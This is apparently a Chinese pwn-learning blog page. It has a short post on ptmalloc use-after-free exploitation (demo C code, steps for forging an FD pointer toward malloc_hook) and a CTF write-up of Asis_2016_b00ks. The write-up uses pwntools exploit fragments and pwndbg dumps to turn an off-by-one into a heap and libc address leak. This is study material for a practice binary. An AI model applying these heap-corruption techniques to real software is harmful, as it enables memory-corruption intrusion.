<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *a;</span><br><span class="line">    a = (<span class="keyword">char</span> *) <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">char</span>)*<span class="number">10</span>); <span class="comment">//申请a</span></span><br><span class="line">    <span class="built_in">memcpy</span>(a,<span class="string">&quot;ywhkkx&quot;</span>,<span class="number">10</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;a addr:%x,%s\n&quot;</span>,a,a);</span><br><span class="line">    <span class="built_in">free</span>(a); <span class="comment">//释放a</span></span><br><span class="line">    <span class="keyword">char</span> *b;</span><br><span class="line">    b = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">char</span>)*<span class="number">10</span>); <span class="comment">//申请相同大小的b</span></span><br><span class="line">    <span class="built_in">memcpy</span>(a,<span class="string">&quot;isacaib&quot;</span>,<span class="number">10</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;b addr:%x,%s\n&quot;</span>,b,b);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;a addr:%x,%s\n&quot;</span>,a,a);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a addr:<span class="number">6792</span>d2a0,ywhkkx</span><br><span class="line">b addr:<span class="number">6792</span>d2a0,isacaib</span><br><span class="line">a addr:<span class="number">6792</span>d2a0,isacaib</span><br></pre></td></tr></table></figure>
<p>可以发现，“a”和“b”指向了同一片内存：对“a”进行控制，就相当于控制了“b”</p>
<h2 id="UAF利用姿势"><a href="#UAF利用姿势" class="headerlink" title="UAF利用姿势"></a>UAF利用姿势</h2><p>利用条件：</p>
<ul>
<li>“free模块”没有置空指针</li>
<li>可以对chunk进行读写</li>
</ul>
<p>利用效果：</p>
<ul>
<li>WAA</li>
</ul>
<p>利用姿势：</p>
<p>一，申请一个chunk，然后释放：</p>
<img src="/2022/01/16/Ptmalloc%E7%AE%97%E6%B3%95%EF%BC%9AUAF/1642849862503-1647533569929.png" class width="1642849862503"> 
<p>二，修改该chunk的FD指针为“ Malloc_hook - 0x10 ”：</p>
<img src="/2022/01/16/Ptmalloc%E7%AE%97%E6%B3%95%EF%BC%9AUAF/1642849962521-1647533569929.png" class width="1642849962521"> 
<p>三，再次申请chunk，并进行修改</p>
<p>原理总述：</p>
<p>利用UAF的特性（可以申请到相同的chunk），先在某个chunk的FD指针中写入 “目标地址 - 0x10” ，程序会误以为它是某个chunk，于是会把这片区域当成chunk给申请出来，最后就可以直接修改了</p>
<p>​        // 如果程序没有提供“修改模块”，则使用Double Free</p>
<hr>
<p>PS：</p>
<p>基于UAF，可以实现一种被称为<strong>Alloc to Stack</strong>的技术，和上述操作一致，只不过把“目标地址”换做了栈地址</p>
<p>Wiki上把它归为Fastbin Attack，但它的利用核心还是UAF</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/01/10/free_hook+off-by-one/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/01/10/free_hook+off-by-one/" class="post-title-link" itemprop="url">free_hook+off-by-one</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-01-10 15:49:45" itemprop="dateCreated datePublished" datetime="2022-01-10T15:49:45+08:00">2022-01-10</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2022-01-16 15:53:45" itemprop="dateModified" datetime="2022-01-16T15:53:45+08:00">2022-01-16</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Pwn-train/" itemprop="url" rel="index"><span itemprop="name">Pwn train</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>12k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>11 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>这是我在学习堆利用时的例题，因为libc版本的原因，例题的exp完全不适用于我的系统，并且我看不太懂Wiki上的解析，导致我受挫了很多次</p>
<p>通过不断的试错，我最终搞明白了其中的原理，泄露出了“libc_base”，但是被“libc-2.29.so以及后续版本”中的保护机制给卡了一下，get不了shell</p>
<p>在不断的调试中，我的GDB用得越来越熟练了，算是受益匪浅吧</p>
<hr>
<p><strong>Asis_2016_b00ks</strong></p>
<p><img src="/2022/01/10/free_hook+off-by-one/1641486377981.png" alt="1641486377981"> </p>
<p>循环输入</p>
<p><img src="/2022/01/10/free_hook+off-by-one/1641486431892.png" alt="1641486431892"> </p>
<p><img src="/2022/01/10/free_hook+off-by-one/1641486441363.png" alt="1641486441363"> </p>
<p>64位，dynamically，开了NX，开了PIE，开了Full RELRO</p>
<p><strong>代码分析</strong></p>
<p><img src="/2022/01/10/free_hook+off-by-one/1641486779773.png" alt="1641486779773"> </p>
<p><img src="/2022/01/10/free_hook+off-by-one/1641486812517.png" alt="1641486812517"> </p>
<p>先输入“name”，最多“read”32字节到“off_202018”中，接着就是进入选项了</p>
<p>1.Create a book：</p>
<p><img src="/2022/01/10/free_hook+off-by-one/1641487287596.png" alt="1641487287596"> </p>
<p>输入“书名长度”，“书名”，“描述长度”，“描述”，最后malloc一个list来存储信息</p>
<p>2.Delete a book：</p>
<p><img src="/2022/01/10/free_hook+off-by-one/1641487724350.png" alt="1641487724350">  </p>
<p>把“书名长度”，“书名”，“描述长度”，“描述”都free了，但只置空了list的指针</p>
<p>3.Edit a book：</p>
<p><img src="/2022/01/10/free_hook+off-by-one/1641487974333.png" alt="1641487974333"> </p>
<p>可以修改“描述”</p>
<p>4.Print book detail：</p>
<p><img src="/2022/01/10/free_hook+off-by-one/1641488022437.png" alt="1641488022437"> </p>
<p>打印信息</p>
<p>5.Change current author name：</p>
<p><img src="/2022/01/10/free_hook+off-by-one/1641488067893.png" alt="1641488067893"> </p>
<p>修改“name”</p>
<p><strong>入侵思路</strong></p>
<p>程序可以修改“description”，那么就要围绕“description”来打，首先搭好框架：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span>(<span class="params">len_book,bookname,len_description,description</span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;Enter book name size: &#x27;</span>,<span class="built_in">str</span>(len_book))</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;(Max 32 chars): &#x27;</span>,bookname)</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;description size: &#x27;</span>,<span class="built_in">str</span>(len_description))</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;description: &#x27;</span>,description)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">index</span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;delete: &#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">	</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change</span>(<span class="params">index,description</span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;want to edit: &#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;book description: &#x27;</span>,description)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>():</span></span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>,<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change_name</span>(<span class="params">name</span>):</span></span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>, <span class="string">&#x27;5&#x27;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&#x27;: &#x27;</span>, name)</span><br></pre></td></tr></table></figure>
<p>程序对于堆溢出有所防范：“description”和“bookname”都是没有堆溢出的</p>
<p><img src="/2022/01/10/free_hook+off-by-one/Users/ywx813/Desktop/HeapAttack/free_hook+off-by-one/wp/1641488067893.png" alt="1641488067893"> </p>
<p>但是“name”的输入却溢出了一字节，这里先看看list中的信息：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( <span class="built_in">list</span> )</span><br><span class="line">&#123;</span><br><span class="line">    *(<span class="built_in">list</span> + <span class="number">6</span>) = len;</span><br><span class="line">    *(list_addr + index) = <span class="built_in">list</span>;</span><br><span class="line">    *(<span class="built_in">list</span> + <span class="number">2</span>) = description;</span><br><span class="line">    *(<span class="built_in">list</span> + <span class="number">1</span>) = bookname;</span><br><span class="line">    *<span class="built_in">list</span> = ++id;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">int</span> id; <span class="comment">//base_addr</span></span><br><span class="line">    <span class="keyword">char</span> *bookname;	<span class="comment">// base_addr+1</span></span><br><span class="line">    <span class="keyword">char</span> *description; <span class="comment">// base_addr+2</span></span><br><span class="line">    <span class="keyword">int</span> size; <span class="comment">// base_addr+6</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>先用GDB看看“name”的位置，和“name”附近有什么</p>
<p>在“name”中输入“flag”，然后“search flag”：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; search -s flag</span><br><span class="line">b00ks           <span class="number">0x555555602040</span> <span class="number">0x67616c66</span> /* <span class="string">&#x27;flag&#x27;</span> */</span><br><span class="line">libc-<span class="number">2.31</span>.so    <span class="number">0x7ffff7dd938b</span> <span class="number">0x5f5f007367616c66</span> /* <span class="string">&#x27;flags&#x27;</span> */</span><br><span class="line">libc-<span class="number">2.31</span>.so    <span class="number">0x7ffff7ddbf01</span> <span class="number">0x5f5f007367616c66</span> /* <span class="string">&#x27;flags&#x27;</span> */</span><br><span class="line">libc-<span class="number">2.31</span>.so    <span class="number">0x7ffff7ddc336</span> <span class="number">0x7563007367616c66</span> /* <span class="string">&#x27;flags&#x27;</span> */</span><br><span class="line">libc-<span class="number">2.31</span>.so    <span class="number">0x7ffff7f77de0</span> <span class="number">0x6f4e007367616c66</span> /* <span class="string">&#x27;flags&#x27;</span> */</span><br><span class="line">libc-<span class="number">2.31</span>.so    <span class="number">0x7ffff7f7ec06</span> <span class="string">&#x27;flags &amp; PRINTF_FORTIFY) != 0&#x27;</span></span><br><span class="line">ld-<span class="number">2.31</span>.so      <span class="number">0x7ffff7ff5213</span> <span class="number">0x642f002967616c66</span> /* <span class="string">&#x27;flag)&#x27;</span> */</span><br><span class="line">ld-<span class="number">2.31</span>.so      <span class="number">0x7ffff7ff5d3e</span> <span class="string">&#x27;flag value(s) of 0x%x in DT_FLAGS_1.\n&#x27;</span></span><br><span class="line">ld-<span class="number">2.31</span>.so      <span class="number">0x7ffff7ff6745</span> <span class="string">&#x27;flags &amp; DL_LOOKUP_RETURN_NEWEST)&#x27;</span></span><br></pre></td></tr></table></figure>
<p>再打印这个地址：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/20xg <span class="number">0x555555602040</span></span><br><span class="line"><span class="number">0x555555602040</span>:	<span class="number">0x0000000067616c66</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555602050</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555602060</span>:	<span class="number">0x00005555556036f0</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555602070</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555602080</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure>
<p>只有一个“0x00005555556036f0”，就是“list_addr”（用于存放malloc的list地址）</p>
<p><img src="/2022/01/10/free_hook+off-by-one/1641547875813.png" alt="1641547875813">  </p>
<p>程序故意把“输入字符串”的末尾设置为“\x00”，但“name”的“\x00”溢出到“list_addr”中了，如果这时申请一个“list”，这时它的写入地址就会存入“list_addr”中，从而覆盖掉“\x00”，就可以利用“printf”打印了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">p.recvuntil(<span class="string">&#x27;Enter author name: &#x27;</span>)</span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">32</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">create(<span class="number">0xe0</span>, <span class="string">&#x27;aaaa&#x27;</span>, <span class="number">0xe0</span>, <span class="string">&#x27;bbbb&#x27;</span>)</span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Author: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&#x27;</span>)</span><br><span class="line">list1_addr=u64(p.recvuntil(<span class="string">&#x27;\n&#x27;</span>)[:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br></pre></td></tr></table></figure>
<p>那么接着干什么呢？还是要围绕“description”来打</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/20gx <span class="number">0x555555602040</span></span><br><span class="line"><span class="number">0x555555602040</span>:	<span class="number">0x0000786b6b687779</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555602050</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555602060</span>:	<span class="number">0x00005555556036f0</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555602070</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure>
<p>“0x00005555556036f0”为<strong>第一个list</strong>，它的低字节是可以被“name”给覆盖的</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/20gx <span class="number">0x555555602040</span></span><br><span class="line"><span class="number">0x555555602040</span>:	<span class="number">0x6161616161616161</span>	<span class="number">0x6161616161616161</span></span><br><span class="line"><span class="number">0x555555602050</span>:	<span class="number">0x6161616161616161</span>	<span class="number">0x6161616161616161</span></span><br><span class="line"><span class="number">0x555555602060</span>:	<span class="number">0x0000555555603600</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555602070</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure>
<p>“0x00005555556036f0”变为了“0x0000555555603600”</p>
<p>这样，程序就会以为“0x0000555555603600”是<strong>第一个list</strong></p>
<p>再分析下heap空间：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/20xg <span class="number">0x555555602040</span></span><br><span class="line"><span class="number">0x555555602040</span>:	<span class="number">0x0000786b6b687779</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555602050</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555602060</span>:	<span class="number">0x00005555556036f0</span>	<span class="number">0x0000555555603760</span>  <span class="comment">#list_1 &amp; list_2</span></span><br><span class="line"><span class="number">0x555555602070</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x5555556036a0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000021</span></span><br><span class="line"><span class="number">0x5555556036b0</span>:	<span class="number">0x0000000071717171</span>	<span class="number">0x0000000000000000</span>	<span class="comment">#list_1_bookname</span></span><br><span class="line"><span class="number">0x5555556036c0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000021</span></span><br><span class="line"><span class="number">0x5555556036d0</span>:	<span class="number">0x0000000077777777</span>	<span class="number">0x0000000000000000</span>	<span class="comment">#list_1_description</span></span><br><span class="line"><span class="number">0x5555556036e0</span>: <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000031</span></span><br><span class="line"><span class="number">0x5555556036f0</span>:	<span class="number">0x0000000000000001</span>	<span class="number">0x00005555556036b0</span>	<span class="comment">#list_1</span></span><br><span class="line"><span class="number">0x555555603700</span>:	<span class="number">0x00005555556036d0</span>	<span class="number">0x0000000000000004</span></span><br><span class="line"><span class="number">0x555555603710</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000021</span></span><br><span class="line"><span class="number">0x555555603720</span>:	<span class="number">0x0000000065656565</span>	<span class="number">0x0000000000000000</span>  <span class="comment">#list_2_bookname</span></span><br><span class="line"><span class="number">0x555555603730</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000021</span></span><br><span class="line"><span class="number">0x555555603740</span>:	<span class="number">0x0000000072727272</span>	<span class="number">0x0000000000000000</span>	<span class="comment">#list_2_description</span></span><br><span class="line"><span class="number">0x555555603750</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000031</span></span><br><span class="line"><span class="number">0x555555603760</span>:	<span class="number">0x0000000000000002</span>	<span class="number">0x0000555555603720</span>	<span class="comment">#list_2</span></span><br><span class="line"><span class="number">0x555555603770</span>:	<span class="number">0x0000555555603740</span>	<span class="number">0x0000000000000004</span></span><br><span class="line"><span class="number">0x555555603780</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000020881</span></span><br></pre></td></tr></table></figure>
<p>如果这样“create list1”，“create list2”，编辑“list_1_description”输入以下数据：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">create(<span class="number">0xe0</span>, <span class="string">&#x27;aaaa&#x27;</span>, <span class="number">0xe0</span>, <span class="string">&#x27;bbbb&#x27;</span>)</span><br><span class="line">create(<span class="number">0x21000</span>, <span class="string">&#x27;cccc&#x27;</span>, <span class="number">0x21000</span>, <span class="string">&#x27;dddd&#x27;</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">0x60</span> + p64(<span class="number">1</span>) + p64(book2_control_ptr + <span class="number">8</span>) * <span class="number">2</span> + p64(<span class="number">0x1000</span>)</span><br><span class="line">change(<span class="number">1</span>,payload)</span><br></pre></td></tr></table></figure>
<p>那么会生成以下的heap空间：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/60xg <span class="number">0x55c18a470390</span></span><br><span class="line"><span class="number">0x55c18a470390</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x00000000000000f1</span></span><br><span class="line"><span class="number">0x55c18a4703a0</span>:	<span class="number">0x6161616161616161</span>	<span class="number">0x6161616161616161</span>	<span class="comment">#list_1_description</span></span><br><span class="line"><span class="number">0x55c18a4703b0</span>:	<span class="number">0x6161616161616161</span>	<span class="number">0x6161616161616161</span></span><br><span class="line"><span class="number">0x55c18a4703c0</span>:	<span class="number">0x6161616161616161</span>	<span class="number">0x6161616161616161</span></span><br><span class="line"><span class="number">0x55c18a4703d0</span>:	<span class="number">0x6161616161616161</span>	<span class="number">0x6161616161616161</span></span><br><span class="line"><span class="number">0x55c18a4703e0</span>:	<span class="number">0x6161616161616161</span>	<span class="number">0x6161616161616161</span></span><br><span class="line"><span class="number">0x55c18a4703f0</span>:	<span class="number">0x6161616161616161</span>	<span class="number">0x6161616161616161</span>	</span><br><span class="line"><span class="number">0x55c18a470400</span>:	<span class="number">0x0000000000000001</span>	<span class="number">0x000055c18a4704c8</span>	<span class="comment">#fake_list</span></span><br><span class="line"><span class="number">0x55c18a470410</span>:	<span class="number">0x000055c18a4704c8</span>	<span class="number">0x0000000000001000</span></span><br><span class="line"><span class="number">0x55c18a470420</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span>	</span><br><span class="line"><span class="number">0x55c18a470430</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x55c18a470440</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x55c18a470450</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x55c18a470460</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x55c18a470470</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x55c18a470480</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000031</span></span><br><span class="line"><span class="number">0x55c18a470490</span>:	<span class="number">0x0000000000000001</span>	<span class="number">0x000055c18a4702b0</span>	<span class="comment">#list_1</span></span><br><span class="line"><span class="number">0x55c18a4704a0</span>:	<span class="number">0x000055c18a4703a0</span>	<span class="number">0x00000000000000e0</span></span><br><span class="line"><span class="number">0x55c18a4704b0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000031</span></span><br><span class="line"><span class="number">0x55c18a4704c0</span>:	<span class="number">0x0000000000000002</span>	<span class="number">0x00007fee78052010</span>	<span class="comment">#list_2</span></span><br><span class="line"><span class="number">0x55c18a4704d0</span>:	<span class="number">0x00007fee78030010</span>	<span class="number">0x0000000000021000</span></span><br><span class="line"><span class="number">0x55c18a4704e0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x000000000001fb21</span></span><br></pre></td></tr></table></figure>
<p>​        // 因为“list2”的“bookname”和“description”很大，所以用mmap函数进行调用</p>
<p>可以发现，如果用“name”把“list_1”尾字节覆盖为“\x00”，程序就会把“fake_list”识别为“list_1”，接着如果用“show”打印，就可以泄露写入的数据</p>
<p>其中“bookname2”会被泄露出来，而“bookname2”是用mmap函数申请的</p>
<p>这里有一个知识：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; vmmap</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">    <span class="number">0x563fc9c00000</span>     <span class="number">0x563fc9c02000</span> r-xp     <span class="number">2000</span> <span class="number">0</span>      /home/ywhkkx/桌面/b00ks</span><br><span class="line">    <span class="number">0x563fc9e01000</span>     <span class="number">0x563fc9e02000</span> r--p     <span class="number">1000</span> <span class="number">1000</span>   /home/ywhkkx/桌面/b00ks</span><br><span class="line">    <span class="number">0x563fc9e02000</span>     <span class="number">0x563fc9e03000</span> rw-p     <span class="number">1000</span> <span class="number">2000</span>   /home/ywhkkx/桌面/b00ks</span><br><span class="line">    <span class="number">0x563fcb86d000</span>     <span class="number">0x563fcb88e000</span> rw-p    <span class="number">21000</span> <span class="number">0</span>      [heap]</span><br><span class="line">    <span class="number">0x7ff6d3dcf000</span>     <span class="number">0x7ff6d3e13000</span> rw-p    <span class="number">44000</span> <span class="number">0</span>      [anon_7ff6d3dcf]</span><br><span class="line">    <span class="number">0x7ff6d3e13000</span>     <span class="number">0x7ff6d3e38000</span> r--p    <span class="number">25000</span> <span class="number">0</span>      /usr/lib/x86_64-linux-gnu/libc-<span class="number">2.31</span>.so</span><br><span class="line">    <span class="number">0x7ff6d3e38000</span>     <span class="number">0x7ff6d3fb0000</span> r-xp   <span class="number">178000</span> <span class="number">25000</span>  /usr/lib/x86_64-linux-gnu/libc-<span class="number">2.31</span>.so</span><br><span class="line">    <span class="number">0x7ff6d3fb0000</span>     <span class="number">0x7ff6d3ffa000</span> r--p    4a000 19d000 /usr/lib/x86_64-linux-gnu/libc-<span class="number">2.31</span>.so</span><br><span class="line">    <span class="number">0x7ff6d3ffa000</span>     <span class="number">0x7ff6d3ffb000</span> ---p     <span class="number">1000</span> <span class="number">1e7000</span> /usr/lib/x86_64-linux-gnu/libc-<span class="number">2.31</span>.so</span><br><span class="line">-------------------------------------------------------------------------</span><br><span class="line">[+] bookname2 &gt;&gt;<span class="number">0x7ff6d3df1010</span></span><br></pre></td></tr></table></figure>
<p>bookname2（0x7ff6d3df1010）：第一次用mmap函数获取的地址</p>
<p>/usr/lib/x86_64-linux-gnu/libc-2.31.so（0x7ff6d3e13000）：libc基址</p>
